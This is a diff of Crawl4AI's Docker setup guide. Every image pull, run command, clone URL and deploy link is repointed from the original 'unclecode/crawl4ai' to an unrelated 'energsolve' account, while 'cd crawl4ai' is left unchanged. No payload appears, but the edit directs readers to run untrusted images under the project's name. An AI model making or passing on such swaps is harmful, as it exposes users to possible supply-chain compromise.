@@ -12,36 +12,36 @@ Choose the appropriate image based on your platform and needs:
 ### For AMD64 (Regular Linux/Windows):
 ```bash
 # Basic version (recommended)
-docker pull unclecode/crawl4ai:basic-amd64
-docker run -p 11235:11235 unclecode/crawl4ai:basic-amd64
+docker pull 503496348-ops/energsolve:basic-amd64
+docker run -p 11235:11235 503496348-ops/energsolve:basic-amd64
 
 # Full ML/LLM support
-docker pull unclecode/crawl4ai:all-amd64
-docker run -p 11235:11235 unclecode/crawl4ai:all-amd64
+docker pull 503496348-ops/energsolve:all-amd64
+docker run -p 11235:11235 503496348-ops/energsolve:all-amd64
 
 # With GPU support
-docker pull unclecode/crawl4ai:gpu-amd64
-docker run -p 11235:11235 unclecode/crawl4ai:gpu-amd64
+docker pull 503496348-ops/energsolve:gpu-amd64
+docker run -p 11235:11235 503496348-ops/energsolve:gpu-amd64
 ```
 
 ### For ARM64 (M1/M2 Macs, ARM servers):
 ```bash
 # Basic version (recommended)
-docker pull unclecode/crawl4ai:basic-arm64
-docker run -p 11235:11235 unclecode/crawl4ai:basic-arm64
+docker pull 503496348-ops/energsolve:basic-arm64
+docker run -p 11235:11235 503496348-ops/energsolve:basic-arm64
 
 # Full ML/LLM support
-docker pull unclecode/crawl4ai:all-arm64
-docker run -p 11235:11235 unclecode/crawl4ai:all-arm64
+docker pull 503496348-ops/energsolve:all-arm64
+docker run -p 11235:11235 503496348-ops/energsolve:all-arm64
 
 # With GPU support
-docker pull unclecode/crawl4ai:gpu-arm64
-docker run -p 11235:11235 unclecode/crawl4ai:gpu-arm64
+docker pull 503496348-ops/energsolve:gpu-arm64
+docker run -p 11235:11235 503496348-ops/energsolve:gpu-arm64
 ```
 
 Need more memory? Add `--shm-size`:
 ```bash
-docker run --shm-size=2gb -p 11235:11235 unclecode/crawl4ai:basic-amd64
+docker run --shm-size=2gb -p 11235:11235 503496348-ops/energsolve:basic-amd64
 ```
 
 Test the installation:
@@ -52,11 +52,11 @@ curl http://localhost:11235/health
 ### For Raspberry Pi (32-bit) (coming soon):
 ```bash
 # Pull and run basic version (recommended for Raspberry Pi)
-docker pull unclecode/crawl4ai:basic-armv7
-docker run -p 11235:11235 unclecode/crawl4ai:basic-armv7
+docker pull 503496348-ops/energsolve:basic-armv7
+docker run -p 11235:11235 503496348-ops/energsolve:basic-armv7
 
 # With increased shared memory if needed
-docker run --shm-size=2gb -p 11235:11235 unclecode/crawl4ai:basic-armv7
+docker run --shm-size=2gb -p 11235:11235 503496348-ops/energsolve:basic-armv7
 ```
 
 Note: Due to hardware constraints, only the basic version is recommended for Raspberry Pi.
@@ -70,7 +70,7 @@ Build the image locally based on your platform:
 
 ```bash
 # Clone the repository
-git clone https://github.com/unclecode/crawl4ai.git
+git clone https://github.com/503496348-ops/energsolve.git
 cd crawl4ai
 
 # For AMD64 (Regular Linux/Windows)
@@ -123,7 +123,7 @@ Docker Compose provides a more structured way to run Crawl4AI, especially when d
 
 ```bash
 # Clone the repository
-git clone https://github.com/unclecode/crawl4ai.git
+git clone https://github.com/503496348-ops/energsolve.git
 cd crawl4ai
 ```
 
@@ -176,7 +176,7 @@ curl http://localhost:11235/health
 
 Deploy your own instance of Crawl4AI with one click:
 
-[![DigitalOcean Referral Badge](https://web-platforms.sfo2.cdn.digitaloceanspaces.com/WWW/Badge%203.svg)](https://www.digitalocean.com/?repo=https://github.com/unclecode/crawl4ai/tree/0.3.74&refcode=a0780f1bdb3d&utm_campaign=Referral_Invite&utm_medium=Referral_Program&utm_source=badge)
+[![DigitalOcean Referral Badge](https://web-platforms.sfo2.cdn.digitaloceanspaces.com/WWW/Badge%203.svg)](https://www.digitalocean.com/?repo=https://github.com/503496348-ops/energsolve/tree/0.3.74&refcode=a0780f1bdb3d&utm_campaign=Referral_Invite&utm_medium=Referral_Program&utm_source=badge)
 
 > 💡 **Recommended specs**: 4GB RAM minimum. Select "professional-xs" or higher when deploying for stable operation.
 
